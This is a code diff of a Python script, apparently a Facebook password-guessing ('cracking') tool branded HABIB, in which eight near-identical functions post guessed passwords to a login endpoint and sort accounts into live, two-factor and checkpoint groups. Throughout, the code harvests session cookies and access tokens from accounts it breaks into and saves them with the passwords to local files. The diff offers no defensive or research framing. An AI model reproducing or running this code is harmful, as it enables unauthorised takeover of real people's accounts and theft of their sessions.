@@ -59,31 +59,20 @@ def api1(ids,names,passlist,tl):
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
-                try:
-                    uid = str(po['uid'])
-                except:
-                    uid=ids
-                check = lock_chaker(uid)
-                if 'Locked' in check:
-                    print('\r\r\x1b[38;5;28m [HABIB-LOCK] '+uid+' | '+pas+'\033[1;97m')
-                    lk.append(uid)
-                    break
-                else:
-                    token = po["access_token"]
-                    print('\r\r\033[92;1m [HABIB-LIVE] '+uid+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
-                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
-                    open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
-                    oks.append(uid);cek_apk(uid,pas,cookies)
-                    break
+                token = po["access_token"]
+                print('\r\r\033[92;1m [HABIB-LIVE] '+ids+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
+                open('/sdcard/HABIB/HABIB-OK.txt','a').write(ids+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
+                oks.append(ids);cek_apk(ids,pas,cookies)
+                break
             elif twf in str(po):
-                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
-                twf.append(uid)
+                print('\r\r \033[1;34m[HABIB-2FAC] '+ids+' | '+pas)
+                twf.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                uid = str(po['error']['error_data']['uid'])
-                #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
-                open('/sdcard/HABIB/HABIB-CP.txt','a').write(uid+'|'+pas+'\n')
-                cps.append(uid)
+                #print('\r\r\033[91;1m [HABIB-DEAD] '+ids+' | '+pas+'\033[1;97m')
+                open('/sdcard/HABIB/HABIB-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
                 break
             else:
                 continue
@@ -153,31 +142,20 @@ def api2(ids,names,passlist,tl):
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
-                try:
-                    uid = str(po['uid'])
-                except:
-                    uid=ids
-                check = lock_chaker(uid)
-                if 'Locked' in check:
-                    print('\r\r\x1b[38;5;28m [HABIB-LOCK] '+uid+' | '+pas+'\033[1;97m')
-                    lk.append(uid)
-                    break
-                else:
-                    token = po["access_token"]
-                    print('\r\r\033[92;1m [HABIB-LIVE] '+uid+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
-                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
-                    open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
-                    oks.append(uid);cek_apk(uid,pas,cookies)
-                    break
+                token = po["access_token"]
+                print('\r\r\033[92;1m [HABIB-LIVE] '+ids+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
+                open('/sdcard/HABIB/HABIB-OK.txt','a').write(ids+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
+                oks.append(ids);cek_apk(ids,pas,cookies)
+                break
             elif twf in str(po):
-                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
-                twf.append(uid)
+                print('\r\r \033[1;34m[HABIB-2FAC] '+ids+' | '+pas)
+                twf.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                uid = str(po['error']['error_data']['uid'])
-                #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
-                open('/sdcard/HABIB/HABIB-CP.txt','a').write(uid+'|'+pas+'\n')
-                cps.append(uid)
+                #print('\r\r\033[91;1m [HABIB-DEAD] '+ids+' | '+pas+'\033[1;97m')
+                open('/sdcard/HABIB/HABIB-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
                 break
             else:
                 continue
@@ -247,31 +225,20 @@ def api3(ids,names,passlist,tl):
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
-                try:
-                    uid = str(po['uid'])
-                except:
-                    uid=ids
-                check = lock_chaker(uid)
-                if 'Locked' in check:
-                    print('\r\r\x1b[38;5;28m [HABIB-LOCK] '+uid+' | '+pas+'\033[1;97m')
-                    lk.append(uid)
-                    break
-                else:
-                    token = po["access_token"]
-                    print('\r\r\033[92;1m [HABIB-LIVE] '+uid+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
-                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
-                    open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
-                    oks.append(uid);cek_apk(uid,pas,cookies)
-                    break
+                token = po["access_token"]
+                print('\r\r\033[92;1m [HABIB-LIVE] '+ids+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
+                open('/sdcard/HABIB/HABIB-OK.txt','a').write(ids+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
+                oks.append(ids);cek_apk(ids,pas,cookies)
+                break
             elif twf in str(po):
-                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
-                twf.append(uid)
+                print('\r\r \033[1;34m[HABIB-2FAC] '+ids+' | '+pas)
+                twf.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                uid = str(po['error']['error_data']['uid'])
-                #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
-                open('/sdcard/HABIB/HABIB-CP.txt','a').write(uid+'|'+pas+'\n')
-                cps.append(uid)
+                #print('\r\r\033[91;1m [HABIB-DEAD] '+ids+' | '+pas+'\033[1;97m')
+                open('/sdcard/HABIB/HABIB-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
                 break
             else:
                 continue
@@ -341,31 +308,20 @@ def api4(ids,names,passlist,tl):
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
-                try:
-                    uid = str(po['uid'])
-                except:
-                    uid=ids
-                check = lock_chaker(uid)
-                if 'Locked' in check:
-                    print('\r\r\x1b[38;5;28m [HABIB-LOCK] '+uid+' | '+pas+'\033[1;97m')
-                    lk.append(uid)
-                    break
-                else:
-                    token = po["access_token"]
-                    print('\r\r\033[92;1m [HABIB-LIVE] '+uid+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
-                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
-                    open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
-                    oks.append(uid);cek_apk(uid,pas,cookies)
-                    break
+                token = po["access_token"]
+                print('\r\r\033[92;1m [HABIB-LIVE] '+ids+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
+                open('/sdcard/HABIB/HABIB-OK.txt','a').write(ids+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
+                oks.append(ids);cek_apk(ids,pas,cookies)
+                break
             elif twf in str(po):
-                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
-                twf.append(uid)
+                print('\r\r \033[1;34m[HABIB-2FAC] '+ids+' | '+pas)
+                twf.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                uid = str(po['error']['error_data']['uid'])
-                #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
-                open('/sdcard/HABIB/HABIB-CP.txt','a').write(uid+'|'+pas+'\n')
-                cps.append(uid)
+                #print('\r\r\033[91;1m [HABIB-DEAD] '+ids+' | '+pas+'\033[1;97m')
+                open('/sdcard/HABIB/HABIB-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
                 break
             else:
                 continue
@@ -435,31 +391,20 @@ def api5(ids,names,passlist,tl):
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
-                try:
-                    uid = str(po['uid'])
-                except:
-                    uid=ids
-                check = lock_chaker(uid)
-                if 'Locked' in check:
-                    print('\r\r\x1b[38;5;28m [HABIB-LOCK] '+uid+' | '+pas+'\033[1;97m')
-                    lk.append(uid)
-                    break
-                else:
-                    token = po["access_token"]
-                    print('\r\r\033[92;1m [HABIB-LIVE] '+uid+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
-                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
-                    open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
-                    oks.append(uid);cek_apk(uid,pas,cookies)
-                    break
+                token = po["access_token"]
+                print('\r\r\033[92;1m [HABIB-LIVE] '+ids+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
+                open('/sdcard/HABIB/HABIB-OK.txt','a').write(ids+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
+                oks.append(ids);cek_apk(ids,pas,cookies)
+                break
             elif twf in str(po):
-                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
-                twf.append(uid)
+                print('\r\r \033[1;34m[HABIB-2FAC] '+ids+' | '+pas)
+                twf.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                uid = str(po['error']['error_data']['uid'])
-                #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
-                open('/sdcard/HABIB/HABIB-CP.txt','a').write(uid+'|'+pas+'\n')
-                cps.append(uid)
+                #print('\r\r\033[91;1m [HABIB-DEAD] '+ids+' | '+pas+'\033[1;97m')
+                open('/sdcard/HABIB/HABIB-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
                 break
             else:
                 continue
@@ -529,31 +474,20 @@ def api6(ids,names,passlist,tl):
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
-                try:
-                    uid = str(po['uid'])
-                except:
-                    uid=ids
-                check = lock_chaker(uid)
-                if 'Locked' in check:
-                    print('\r\r\x1b[38;5;28m [HABIB-LOCK] '+uid+' | '+pas+'\033[1;97m')
-                    lk.append(uid)
-                    break
-                else:
-                    token = po["access_token"]
-                    print('\r\r\033[92;1m [HABIB-LIVE] '+uid+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
-                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
-                    open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
-                    oks.append(uid);cek_apk(uid,pas,cookies)
-                    break
+                token = po["access_token"]
+                print('\r\r\033[92;1m [HABIB-LIVE] '+ids+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
+                open('/sdcard/HABIB/HABIB-OK.txt','a').write(ids+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
+                oks.append(ids);cek_apk(ids,pas,cookies)
+                break
             elif twf in str(po):
-                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
-                twf.append(uid)
+                print('\r\r \033[1;34m[HABIB-2FAC] '+ids+' | '+pas)
+                twf.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                uid = str(po['error']['error_data']['uid'])
-                #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
-                open('/sdcard/HABIB/HABIB-CP.txt','a').write(uid+'|'+pas+'\n')
-                cps.append(uid)
+                #print('\r\r\033[91;1m [HABIB-DEAD] '+ids+' | '+pas+'\033[1;97m')
+                open('/sdcard/HABIB/HABIB-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
                 break
             else:
                 continue
@@ -623,31 +557,20 @@ def api7(ids,names,passlist,tl):
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
-                try:
-                    uid = str(po['uid'])
-                except:
-                    uid=ids
-                check = lock_chaker(uid)
-                if 'Locked' in check:
-                    print('\r\r\x1b[38;5;28m [HABIB-LOCK] '+uid+' | '+pas+'\033[1;97m')
-                    lk.append(uid)
-                    break
-                else:
-                    token = po["access_token"]
-                    print('\r\r\033[92;1m [HABIB-LIVE] '+uid+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
-                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
-                    open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
-                    oks.append(uid);cek_apk(uid,pas,cookies)
-                    break
+                token = po["access_token"]
+                print('\r\r\033[92;1m [HABIB-LIVE] '+ids+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
+                open('/sdcard/HABIB/HABIB-OK.txt','a').write(ids+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
+                oks.append(ids);cek_apk(ids,pas,cookies)
+                break
             elif twf in str(po):
-                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
-                twf.append(uid)
+                print('\r\r \033[1;34m[HABIB-2FAC] '+ids+' | '+pas)
+                twf.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                uid = str(po['error']['error_data']['uid'])
-                #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
-                open('/sdcard/HABIB/HABIB-CP.txt','a').write(uid+'|'+pas+'\n')
-                cps.append(uid)
+                #print('\r\r\033[91;1m [HABIB-DEAD] '+ids+' | '+pas+'\033[1;97m')
+                open('/sdcard/HABIB/HABIB-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
                 break
             else:
                 continue
@@ -717,31 +640,20 @@ def api8(ids,names,passlist,tl):
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             po = requests.post(url,data=data,headers=headers).json()
             if 'session_key' in po:
-                try:
-                    uid = str(po['uid'])
-                except:
-                    uid=ids
-                check = lock_chaker(uid)
-                if 'Locked' in check:
-                    print('\r\r\x1b[38;5;28m [HABIB-LOCK] '+uid+' | '+pas+'\033[1;97m')
-                    lk.append(uid)
-                    break
-                else:
-                    token = po["access_token"]
-                    print('\r\r\033[92;1m [HABIB-LIVE] '+uid+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
-                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
-                    open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
-                    oks.append(uid);cek_apk(uid,pas,cookies)
-                    break
+                token = po["access_token"]
+                print('\r\r\033[92;1m [HABIB-LIVE] '+ids+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
+                open('/sdcard/HABIB/HABIB-OK.txt','a').write(ids+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
+                oks.append(ids);cek_apk(ids,pas,cookies)
+                break
             elif twf in str(po):
-                print('\r\r \033[1;34m[HABIB-2FAC] '+uid+' | '+pas)
-                twf.append(uid)
+                print('\r\r \033[1;34m[HABIB-2FAC] '+ids+' | '+pas)
+                twf.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                uid = str(po['error']['error_data']['uid'])
-                #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
-                open('/sdcard/HABIB/HABIB-CP.txt','a').write(uid+'|'+pas+'\n')
-                cps.append(uid)
+                #print('\r\r\033[91;1m [HABIB-DEAD] '+ids+' | '+pas+'\033[1;97m')
+                open('/sdcard/HABIB/HABIB-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
                 break
             else:
                 continue
